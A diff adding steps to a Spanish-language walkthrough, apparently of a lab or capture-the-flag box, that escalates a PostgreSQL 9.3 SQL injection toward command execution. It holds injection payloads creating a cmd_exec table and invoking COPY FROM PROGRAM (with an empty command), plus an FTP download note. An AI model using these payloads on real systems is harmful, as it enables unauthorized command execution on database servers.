@@ -79,4 +79,11 @@ Nos damos cuenta que tarda 10 segundos en responder así que es vulnerable a SQL
 
 Para la versión 9.3 se puede elevar la inyección SQL a un RCE ejecución remota de comandos, tenemos toda la información en HackTricks
 
+Primero vamos a crear una tabla
+`';CREATE+TABLE+cmd_exec(cmd_output+text);-- -`
+
+- Nos traemos a la maquina local el .exe del FTP poniendonos en modo binario con `binary` y luego haciendo un `get docker-toolbox.exe`
+
+Ahora vamos a ejecutar un comando
+`';COPY+cmd_exec+FROM+PROGRAM+'';--+-`
 
